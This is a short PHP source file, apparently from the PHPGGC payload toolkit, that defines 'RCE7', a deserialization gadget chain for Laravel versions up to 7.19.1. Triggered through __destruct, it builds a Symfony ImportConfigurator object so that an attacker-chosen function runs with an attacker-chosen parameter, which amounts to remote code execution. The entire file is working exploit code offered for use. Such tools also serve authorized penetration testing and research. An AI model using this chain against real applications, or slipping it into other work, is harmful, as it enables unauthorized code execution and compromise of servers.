<?php

namespace GadgetChain\Laravel;

class RCE7 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '<=7.19.1';
    public static $vector = '__destruct';
    public static $author = 'AFKL';
	public static $informations = '
	It is not possible to run a function like (system) in this chain.
	Due to its structure, the function is called with two null arguments after it.
	';

    public function generate(array $parameters)
    {
		$function = $parameters['function'];
        $parameter = $parameters['parameter'];
		
		return new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($function, $parameter);
    }
}